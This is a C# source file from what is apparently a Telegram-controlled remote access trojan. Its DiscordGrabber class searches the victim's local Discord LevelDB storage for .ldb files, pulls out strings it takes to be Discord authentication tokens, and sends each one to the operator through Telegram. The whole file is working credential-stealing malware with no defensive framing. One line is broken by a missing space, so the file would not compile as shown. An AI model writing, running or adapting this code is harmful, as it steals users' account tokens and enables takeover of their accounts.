namespace TelegramRAT
{
    internal class DiscordGrabber
    {

        // Get token
        public static void get()
        {
            var files = SearchForFile();
            if (files.Count == 0)
            {
                telegram.sendText("⛔ Didn't find any ldb files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        telegram.sendText($"💎 Discord token: {match.ToString()}");
                    }
                }
            }
        }

        // Locate *.ldb files
        private static List<string> SearchForFile()
        {
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string discordPath = Path.Combine(appDataPath, "Discord");
            stringldbFilePath = Path.Combine(discordPath, "Local Storage", "leveldb");

            if (!Directory.Exists(ldbFilePath))
            {
                telegram.sendText("⚠️ Discord client ldb file path does not exist.");
                return new List<string>();
            }

            List<string> ldbFiles = new List<string>();

            foreach (string file in Directory.GetFiles(ldbFilePath, "*.ldb"))
            {
                string content = File.ReadAllText(file);
                if (content.Contains("okay"))
                {
                    ldbFiles.Add(content);
                }
            }

            return ldbFiles;
        }


    }
}

